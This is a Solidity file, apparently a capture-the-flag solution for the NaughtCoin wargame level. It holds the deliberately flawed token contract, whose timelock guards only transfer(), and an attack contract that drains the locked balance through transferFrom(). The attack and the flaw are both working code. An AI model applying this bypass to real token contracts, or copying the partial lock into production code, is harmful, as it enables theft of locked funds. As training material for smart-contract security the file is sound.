// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract NaughtCoin is ERC20 {
    // string public constant name = 'NaughtCoin';
    // string public constant symbol = '0x0';
    // uint public constant decimals = 18;
    uint256 public timeLock = now + 10 * 365 days;
    uint256 public INITIAL_SUPPLY;
    address public player;

    constructor(address _player) public ERC20("NaughtCoin", "0x0") {
        player = _player;
        INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
        // _totalSupply = INITIAL_SUPPLY;
        // _balances[player] = INITIAL_SUPPLY;
        _mint(player, INITIAL_SUPPLY);
        emit Transfer(address(0), player, INITIAL_SUPPLY);
    }

    function transfer(address _to, uint256 _value)
        public
        override
        lockTokens
        returns (bool)
    {
        super.transfer(_to, _value);
    }

    // Prevent the initial owner from transferring tokens until the timelock has passed
    modifier lockTokens() {
        if (msg.sender == player) {
            require(now > timeLock);
            _;
        } else {
            _;
        }
    }
}

contract AttackNaughtCoin {
    address payable public owner;
    IERC20 naughtcoin;

    modifier onlyOwner() {
        require(msg.sender == owner, "Sender is not owner");
        _;
    }

    constructor(address _NaughtcoinToken) public {
        owner = msg.sender;
        naughtcoin = IERC20(_NaughtcoinToken);
    }

    // NaughtCoin locktokens() modifier only applies to transfer(), so we can bypass
    // locktokens() by using transferFrom()
    function attack() public onlyOwner {
        naughtcoin.transferFrom(
            owner,
            address(this),
            naughtcoin.balanceOf(owner)
        );
    }
}
